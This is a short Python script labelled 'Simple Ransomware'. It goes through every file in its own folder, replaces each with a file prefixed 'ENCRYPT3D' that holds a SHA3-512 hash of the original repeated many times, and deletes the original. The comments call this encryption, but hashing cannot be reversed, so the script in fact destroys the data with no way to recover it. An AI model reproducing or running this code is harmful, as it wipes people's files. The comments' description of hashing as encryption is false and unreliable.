### Simple Ransomware in Python ###

import hashlib
import os
import pathlib

### The path that the program will encrypt ###
### In this case it's current path ###
folder = pathlib.Path(__file__).parent.absolute()

### List files in the folder of the path ###
for files in os.listdir(folder):

    ### Enter the folder ###
    os.chdir(folder)
    with open(files, 'rb') as r:

        ### Encrypt every file in the directory ###
        data = r.read()
        encrypt = hashlib.sha3_512(data).hexdigest()
        new = 'ENCRYPT3D ' + os.path.basename(files)

        with open(new, 'wb') as n:
            
            ### Write the encrypted file to the new one ###
            n.write(bytes(encrypt, encoding='utf-8') * 0xFF)

            ### Close the opened files ###
            n.close()
            r.close()

            ### Delete the older files ###
            os.remove(files)

            
